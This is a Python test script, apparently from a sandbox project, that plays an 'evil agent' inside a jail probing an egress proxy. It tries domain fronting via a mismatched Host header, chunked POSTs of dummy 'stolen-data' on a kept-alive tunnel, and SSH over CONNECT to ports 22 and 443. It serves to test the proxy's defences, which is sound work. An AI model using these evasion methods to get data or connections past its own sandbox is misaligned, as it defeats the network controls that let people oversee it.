"""Evil agent: hide where it goes (domain fronting) or what it sends (tunnels) from the proxy.

Runs INSIDE the jail, as the agent's user (python3 -c). Usage:
<script> <allowed host> <host not allowed> <tag>
Prints one JSON object on its last line.

- Fronting: a tunnel to the allowed host whose request names the other one in ``Host``; and the
  same on a tunnel that a first, honest GET already opened, with a body sent in chunks (the case
  T06-4's review found: mitmproxy streamed it out before the gate saw it).
- The honest chunked POST on a kept-alive tunnel, which must wait for backtide like any other.
- ``CONNECT`` to the SSH port, and SSH's greeting (plain bytes, no TLS) inside a ``CONNECT`` to
  443: a raw TCP tunnel to the allowed host.
"""

import http.client
import json
import socket
import ssl
import sys

allowed, other, tag = sys.argv[1:4]
PROXY = ("backtide-proxy", 8080)
CA = "/etc/backtide-ca/ca.pem"


def chunks():
    for n in range(64):
        yield b"stolen-data-" + bytes([65 + n % 26]) * 1024


def kept_alive(host_header, path):
    """On ONE tunnel to the allowed host: a GET, then a chunked POST naming ``host_header``."""
    conn = http.client.HTTPSConnection(
        *PROXY, timeout=60, context=ssl.create_default_context(cafile=CA)
    )
    conn.set_tunnel(allowed, 443)
    try:
        conn.request("GET", f"{path}-get")
        first = conn.getresponse()
        first.read()
        headers = {"Host": host_header, "Content-Type": "application/octet-stream"}
        conn.request("POST", path, body=chunks(), headers=headers, encode_chunked=True)
        second = conn.getresponse()
        second.read()
        return [first.status, second.status]
    except (OSError, http.client.HTTPException) as error:
        return f"{type(error).__name__}: {error}"[:200]
    finally:
        conn.close()


def fronted(path):
    conn = http.client.HTTPSConnection(
        *PROXY, timeout=30, context=ssl.create_default_context(cafile=CA)
    )
    conn.set_tunnel(allowed, 443)
    try:
        conn.request("GET", path, headers={"Host": other})
        return conn.getresponse().status
    except (OSError, http.client.HTTPException) as error:
        return f"{type(error).__name__}: {error}"[:200]
    finally:
        conn.close()


def raw_connect(port, payload):
    """CONNECT allowed:port; then, if let through, ``payload`` as is. What came back."""
    try:
        with socket.create_connection(PROXY, timeout=15) as sock:
            where = f"{allowed}:{port}"
            sock.sendall(f"CONNECT {where} HTTP/1.1\r\nHost: {where}\r\n\r\n".encode())
            head = sock.recv(4096)
            status = int(head.split(b" ", 2)[1]) if head.startswith(b"HTTP/") else None
            if status != 200:
                return {"connect": status}
            sock.sendall(payload)
            try:
                answer = sock.recv(4096)
            except OSError as error:
                answer = f"{type(error).__name__}".encode()
            return {"connect": status, "answer": answer[:200].decode("latin-1")}
    except OSError as error:
        return {"connect": f"{type(error).__name__}: {error}"[:200]}


print(
    json.dumps(
        {
            "fronted": fronted(f"/{tag}/fronted"),
            "fronted_chunked": kept_alive(other, f"/{tag}/fronted-chunked"),
            "honest_chunked": kept_alive(allowed, f"/{tag}/honest-chunked"),
            "ssh_port": raw_connect(22, b"SSH-2.0-OpenSSH_9.9\r\n"),
            "ssh_in_443": raw_connect(443, b"SSH-2.0-OpenSSH_9.9\r\n"),
        }
    )
)
